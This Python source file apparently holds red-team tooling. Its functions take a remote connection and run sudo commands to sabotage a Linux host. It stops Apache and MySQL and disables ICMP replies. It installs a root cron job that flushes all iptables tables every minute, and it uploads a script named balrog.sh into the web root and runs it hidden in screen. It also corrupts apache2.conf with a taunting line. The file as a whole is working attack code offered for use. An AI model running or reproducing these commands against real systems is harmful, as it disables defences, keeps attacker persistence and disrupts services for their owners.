def off_apache(connect):
    connect.sudo("systemctl start apache2.service") #cuz linux is dumb
    connect.sudo("systemctl stop apache2.service")


def off_mysql(connect):
    connect.sudo("systemctl stop mysql.service")


def off_ping(connect):
    connect.sudo('sh -c "echo \"1\" > /proc/sys/net/ipv4/icmp_echo_ignore_all"')


def disable_firewall(connect):
    connect.sudo("sh -c 'cd / && printf \"* * * * * iptables -t nat -F && iptables -t filter -F && iptables -t "
                 "security -F && iptables -t raw -F && iptables -t mangle -F\n\" > mycron && crontab mycron && rm "
                 "mycron'")

def tyler_apache_disable_loop(connect):
    connect.sudo('apt install dtach -y')
    connect.put('UploadFiles/balrog.sh')
    connect.sudo('mv balrog.sh /var/www/html')
    connect.sudo('chmod +x /var/www/html/balrog.sh')
    connect.sudo("screen -d -m /var/www/html/./balrog.sh")

def tyler_apache_disable_conf(connect):
    connect.sudo("sed -i '100i The answer you seek lies within' /etc/apache2/apache2.conf")
    # connect.sudo('mkdir -p /var/www/html/Answer')
    # connect.sudo("sh -c 'echo \"The answer lies within! (your config)\" > /var/www/html/Answer/answer.txt'")
    connect.sudo('systemctl stop apache2')
